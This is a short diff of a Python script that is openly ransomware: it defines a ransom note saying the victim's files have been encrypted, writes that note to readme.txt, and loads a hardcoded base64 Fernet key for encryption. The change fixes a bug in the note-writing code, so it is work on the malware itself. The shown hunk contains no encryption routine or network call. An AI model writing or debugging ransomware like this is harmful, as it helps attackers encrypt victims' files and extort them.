@@ -3,9 +3,9 @@ import base64
 user = os.getenv("username")
 rnote = "Your files have been encrypted and you cant pay us."
 import re
-ransomnote = open("readme.txt", "w")
-f.write(rnote)
-f.close()
+ransom = open("readme.txt", "w")
+ransom.write(rnote)
+ransom.close()
 from cryptography.fernet import Fernet
 # Use your own key and initialization vector (IV) for encryption
 key = base64.b64decode('NFhMMWNtbUU2X3pnVTV1QXVGZTZBQ2pOMjMxWk00ZHVhaHdYay1rd090OD0=')
